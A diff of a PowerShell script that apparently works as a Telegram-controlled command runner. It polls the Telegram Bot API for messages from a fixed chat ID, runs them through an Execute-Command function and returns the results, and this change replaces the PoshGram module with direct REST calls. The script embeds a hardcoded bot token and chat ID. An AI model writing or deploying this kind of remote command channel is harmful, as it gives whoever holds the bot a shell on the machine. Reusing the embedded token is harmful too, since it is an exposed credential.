@@ -1,27 +1,7 @@
-# Ensure PoshGram is installed
-if (-not (Get-Module -ListAvailable -Name PoshGram)) {
-    try {
-        Install-Module -Name PoshGram -Scope CurrentUser -Force -ErrorAction Stop
-        Write-Host "PoshGram module installed successfully."
-    }
-    catch {
-        Write-Error "Failed to install PoshGram module: $_"
-        exit
-    }
-}
-
-# Import PoshGram module
-try {
-    Import-Module PoshGram -ErrorAction Stop
-}
-catch {
-    Write-Error "Failed to import PoshGram module: $_"
-    exit
-}
-
 # Telegram Bot Token and Chat ID
-$BOT_TOKEN = "8273212830:AAHdcO2H9nH_HHkwV0rVprnClLsUo56ZPYE"  # Replace with your Telegram Bot Token
-$CHAT_ID = "5681247685"      # Replace with your Telegram Chat ID
+$BOT_TOKEN = "8273212830:AAHdcO2H9nH_HHkwV0rVprnClLsUo56ZPYE"
+$CHAT_ID = "5681247685"
+$TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"
 
 # Function to execute commands
 function Execute-Command {
@@ -43,7 +23,12 @@ function Send-TelegramMessage {
         [string]$Message
     )
     try {
-        Send-TelegramTextMessage -BotToken $BOT_TOKEN -ChatId $CHAT_ID -Message $Message
+        $uri = "$TELEGRAM_API/sendMessage"
+        $body = @{
+            chat_id = $CHAT_ID
+            text = $Message
+        } | ConvertTo-Json
+        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
     }
     catch {
         Write-Error "Failed to send Telegram message: $_"
@@ -55,7 +40,8 @@ $offset = 0
 while ($true) {
     try {
         # Get updates from Telegram
-        $updates = Get-TelegramUpdate -BotToken $BOT_TOKEN -Offset $offset
+        $uri = "$TELEGRAM_API/getUpdates?offset=$offset"
+        $updates = Invoke-RestMethod -Uri $uri -Method Get
 
         foreach ($update in $updates.result) {
             if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
